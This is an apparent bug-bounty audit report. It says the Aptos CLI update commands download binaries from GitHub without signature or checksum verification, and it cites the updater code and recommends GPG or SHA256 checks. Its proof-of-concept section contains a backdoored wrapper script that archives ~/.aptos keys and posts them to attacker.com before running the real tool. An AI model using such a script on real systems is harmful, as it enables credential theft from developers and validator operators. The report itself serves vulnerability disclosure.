# Audit Report

## Title
Missing Cryptographic Verification in Binary Update Mechanism Enables Supply Chain Attacks

## Summary
The Aptos CLI binary update mechanism downloads and executes binaries from GitHub releases without performing any cryptographic signature verification or checksum validation. All update paths (aptos CLI self-update, movefmt, revela, and prover dependencies) rely solely on HTTPS transport security, making them vulnerable to supply chain attacks through repository compromise or TLS infrastructure attacks.

## Finding Description

The binary update mechanism in the Aptos CLI uses the `self_update` crate to download binaries from GitHub releases without any cryptographic verification. The vulnerability is present in multiple components:

**1. Movefmt Update (movebit/movefmt repository)**

The `build_updater()` function delegates to the shared helper without adding any verification: [1](#0-0) 

**2. Core Update Helper (used by all updaters)**

The `build_updater()` helper function in `update_helper.rs` configures the `self_update` crate without any signature or checksum verification: [2](#0-1) 

**3. Aptos CLI Self-Update (aptos-labs/aptos-core repository)**

The Aptos CLI's own update mechanism also lacks verification: [3](#0-2) 

**4. Third-Party Tools (Revela from verichains/revela)** [4](#0-3) 

**5. Prover Dependencies (aptos-labs/prover-dependency)** [5](#0-4) 

The `self_update` crate dependency configuration shows no security features enabled: [6](#0-5) 

**Attack Vectors:**

1. **Repository Compromise**: An attacker gaining access to any of the source repositories (aptos-labs/aptos-core, movebit/movefmt, verichains/revela, aptos-labs/prover-dependency) can upload malicious binaries to releases
2. **TLS/CA Compromise**: An attacker with TLS infrastructure access (rogue CA, DNS hijacking) can serve malicious binaries during downloads
3. **GitHub API Compromise**: Compromise of GitHub's infrastructure could redirect downloads to attacker-controlled binaries

When a developer or validator operator runs update commands (`aptos update`, `aptos update movefmt`, `aptos update revela`, etc.), the system downloads and executes binaries with no verification that they haven't been tampered with.

## Impact Explanation

This qualifies as **Critical Severity** under the Aptos bug bounty program for the following reasons:

**Remote Code Execution on Validator Nodes**: When validator operators use the CLI to update tools, compromised binaries execute with full system privileges. This enables:
- Private key theft (validator signing keys, operator keys)
- Transaction manipulation
- Consensus disruption
- State database corruption
- Network credential theft

**Developer Machine Compromise**: Developers using the Aptos CLI for smart contract development, testing, or deployment can have their machines compromised, leading to:
- Supply chain attacks on Move modules
- Theft of deployment keys
- Malicious contract deployment

**Third-Party Supply Chain Risk**: Two of the four update paths download from third-party repositories (movebit and verichains), expanding the attack surface beyond Aptos Foundation's control.

## Likelihood Explanation

**Medium-to-High Likelihood** due to several factors:

1. **Multiple Attack Surfaces**: Four different repositories, three different organizations (aptos-labs, movebit, verichains)
2. **No Defense in Depth**: HTTPS is the only security layer; no cryptographic verification exists
3. **Historical Precedent**: Supply chain attacks through compromised software updates are well-documented (SolarWinds, Codecov, ua-parser-js)
4. **Third-Party Dependencies**: Reliance on external repositories (movebit, verichains) that may have weaker security postures
5. **GitHub as Single Point of Failure**: All updates depend on GitHub's infrastructure security

While repository compromise requires attacker sophistication, the complete absence of verification means any successful compromise immediately leads to RCE with no additional barriers.

## Recommendation

Implement cryptographic verification for all binary downloads using one of these approaches:

**Option 1: GPG Signature Verification (Preferred)**
1. Sign all release binaries with GPG keys
2. Distribute public keys through multiple channels (GitHub, official website, package managers)
3. Verify signatures before installation
4. Implement key rotation procedures

**Option 2: Checksum Verification (Minimum)**
1. Generate SHA256 checksums for all release binaries
2. Sign the checksum file with GPG
3. Verify checksums match before installation
4. Publish checksums in release notes and on official website

**Implementation Example for Option 2:**

```rust
// In update_helper.rs, add after downloading:
fn verify_binary_checksum(binary_path: &Path, expected_checksum: &str) -> Result<()> {
    use sha2::{Sha256, Digest};
    use std::fs::File;
    use std::io::Read;
    
    let mut file = File::open(binary_path)?;
    let mut hasher = Sha256::new();
    let mut buffer = [0; 8192];
    
    loop {
        let count = file.read(&mut buffer)?;
        if count == 0 { break; }
        hasher.update(&buffer[..count]);
    }
    
    let computed = format!("{:x}", hasher.finalize());
    if computed != expected_checksum {
        bail!("Checksum verification failed. Expected {}, got {}", 
              expected_checksum, computed);
    }
    Ok(())
}

// Fetch checksums from signed release notes
// Verify signature of checksum file using embedded public key
// Call verify_binary_checksum() before executing
```

**Additional Recommendations:**
1. Pin specific commit hashes or tags in addition to version numbers
2. Implement binary transparency logs for audit trails
3. Add update notifications to security mailing lists
4. Document the verification process for users
5. Coordinate with third-party repositories (movebit, verichains) to implement similar verification

## Proof of Concept

**Attack Simulation Steps:**

```bash
# Step 1: Attacker compromises a GitHub repository or performs MITM
# Step 2: Attacker creates malicious binary (e.g., backdoored movefmt)

# Create malicious binary that steals credentials
cat > malicious_movefmt.sh << 'EOF'
#!/bin/bash
# Exfiltrate Aptos keys
tar czf /tmp/aptos_keys.tar.gz ~/.aptos
curl -X POST https://attacker.com/exfil -d @/tmp/aptos_keys.tar.gz
# Execute legitimate movefmt to avoid detection
/usr/local/bin/movefmt.real "$@"
EOF

chmod +x malicious_movefmt.sh

# Step 3: Victim runs update command
aptos update movefmt

# Step 4: Malicious binary is downloaded and installed without verification
# The code path shows no cryptographic checks:
# movefmt.rs:102-114 -> update_helper.rs:28-78 -> self_update crate download

# Step 5: Victim uses movefmt, triggering malicious code
aptos move fmt

# Result: Attacker receives validator keys, can sign malicious blocks
```

**Code Flow Demonstrating Missing Verification:**

1. User executes: `aptos update movefmt`
2. `movefmt.rs:build_updater()` calls `update_helper::build_updater()`
3. `update_helper.rs:67-77` configures `self_update::Update` with repo details
4. `self_update` downloads binary over HTTPS (transport security only)
5. Binary is executed with no signature or checksum verification
6. No cryptographic validation occurs anywhere in the code path

The absence of verification patterns can be confirmed by searching the entire update module for security keywords, which returns zero matches for: `verify`, `signature`, `checksum`, `sha256`, `gpg`, `hash`, or `digest`.

## Notes

**Scope Clarification**: While the CLI update mechanism is not part of the core blockchain consensus protocol, it directly impacts validator operator security and developer tooling security. Compromised validators can disrupt consensus, and compromised developers can introduce malicious smart contracts.

**Defense in Depth**: HTTPS provides only transport-level security. It does not protect against:
- Compromised source repositories
- Insider threats at GitHub or third-party organizations  
- Certificate authority compromise
- State-level adversaries with TLS interception capabilities

**Industry Standard**: Major software projects (Rust, Go, Python, Node.js, etc.) all implement cryptographic signature verification for binary updates. The absence of this fundamental security control represents a significant deviation from industry best practices.

**Immediate Mitigation**: Until cryptographic verification is implemented, users should:
1. Manually verify checksums if published separately
2. Download binaries from official sources only
3. Use package managers (homebrew, apt) when available
4. Monitor release announcements for suspicious activity

### Citations

**File:** crates/aptos/src/update/movefmt.rs (L102-114)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        build_updater(
            info,
            self.install_dir.clone(),
            self.repo_owner.clone(),
            self.repo_name.clone(),
            FORMATTER_BINARY_NAME,
            "unknown-linux-gnu",
            "apple-darwin",
            "windows",
            self.prompt_options.assume_yes,
        )
    }
```

**File:** crates/aptos/src/update/update_helper.rs (L28-78)
```rust
pub fn build_updater(
    info: &UpdateRequiredInfo,
    install_dir: Option<PathBuf>,
    repo_owner: String,
    repo_name: String,
    binary_name: &str,
    linux_name: &str,
    mac_os_name: &str,
    windows_name: &str,
    assume_yes: bool,
) -> Result<Box<dyn ReleaseUpdate>> {
    // Determine the target we should download based on how the CLI itself was built.
    let arch_str = get_arch();
    let build_info = cli_build_information();
    let target = match build_info.get(BUILD_OS).context("Failed to determine build info of current CLI")?.as_str() {
        "linux-aarch64" | "linux-x86_64" => linux_name,
        "macos-aarch64" | "macos-x86_64" => mac_os_name,
        "windows-x86_64" => windows_name,
        wildcard => bail!("Self-updating is not supported on your OS ({}) right now, please download the binary manually", wildcard),
    };

    let target = format!("{}-{}", arch_str, target);

    let install_dir = match install_dir.clone() {
        Some(dir) => dir,
        None => {
            let dir = get_additional_binaries_dir();
            // Make the directory if it doesn't already exist.
            std::fs::create_dir_all(&dir)
                .with_context(|| format!("Failed to create directory: {:?}", dir))?;
            dir
        },
    };

    let current_version = match &info.current_version {
        Some(version) => version,
        None => "0.0.0",
    };

    Update::configure()
        .bin_install_dir(install_dir)
        .bin_name(binary_name)
        .repo_owner(&repo_owner)
        .repo_name(&repo_name)
        .current_version(current_version)
        .target_version_tag(&format!("v{}", info.target_version))
        .target(&target)
        .no_confirm(assume_yes)
        .build()
        .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
}
```

**File:** crates/aptos/src/update/aptos.rs (L96-149)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        let installation_method =
            InstallationMethod::from_env().context("Failed to determine installation method")?;
        match installation_method {
            InstallationMethod::Source => {
                return Err(anyhow!(
                    "Detected this CLI was built from source, refusing to update"
                ));
            },
            InstallationMethod::Homebrew => {
                return Err(anyhow!(
                    "Detected this CLI comes from homebrew, use `brew upgrade aptos` instead"
                ));
            },
            InstallationMethod::PackageManager => {
                return Err(anyhow!(
                    "Detected this CLI comes from a package manager, use your package manager to update instead"
                ));
            },
            InstallationMethod::Other => {},
        }

        // Determine the target we should download. This is necessary because we don't
        // name our binary releases using the target triples nor do we build specifically
        // for all major triples, so we have to generalize to one of the binaries we do
        // happen to build. We figure this out based on what system the CLI was built on.
        let build_info = cli_build_information();
        let target = match build_info.get(BUILD_OS).context("Failed to determine build info of current CLI")?.as_str() {
            "linux-x86_64" => "Linux-x86_64",
            "linux-aarch64" => "Linux-aarch64",
            "macos-x86_64" => "macOS-x86_64",
            "macos-aarch64" => "macOS-arm64",
            "windows-x86_64" => "Windows-x86_64",
            wildcard => return Err(anyhow!("Self-updating is not supported on your OS ({}) right now, please download the binary manually", wildcard)),
        };

        let current_version = match &info.current_version {
            Some(version) => version,
            None => unreachable!("current_version should always be Some at this point"),
        };

        // Build a new configuration that will direct the library to download the
        // binary with the target version tag and target that we determined above.
        Update::configure()
            .repo_owner(&self.repo_owner)
            .repo_name(&self.repo_name)
            .bin_name("aptos")
            .current_version(current_version)
            .target_version_tag(&format!("aptos-cli-v{}", info.target_version))
            .target(target)
            .no_confirm(self.prompt_options.assume_yes)
            .build()
            .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
    }
```

**File:** crates/aptos/src/update/revela.rs (L95-107)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        build_updater(
            info,
            self.install_dir.clone(),
            self.repo_owner.clone(),
            self.repo_name.clone(),
            REVELA_BINARY_NAME,
            "unknown-linux-gnu",
            "apple-darwin",
            "pc-windows-gnu",
            self.prompt_options.assume_yes,
        )
    }
```

**File:** crates/aptos/src/update/prover_dependency_installer.rs (L106-118)
```rust
    fn build_updater(&self, info: &UpdateRequiredInfo) -> Result<Box<dyn ReleaseUpdate>> {
        build_updater(
            info,
            self.install_dir.clone(),
            REPO_OWNER.to_string(),
            REPO_NAME.to_string(),
            &self.binary_name,
            "unknown-linux-gnu",
            "apple-darwin",
            "windows",
            self.assume_yes,
        )
    }
```

**File:** crates/aptos/Cargo.toml (L99-102)
```text
self_update = { git = "https://github.com/banool/self_update.git", rev = "8306158ad0fd5b9d4766a3c6bf967e7ef0ea5c4b", features = [
    "archive-zip",
    "compression-zip-deflate",
] }
```
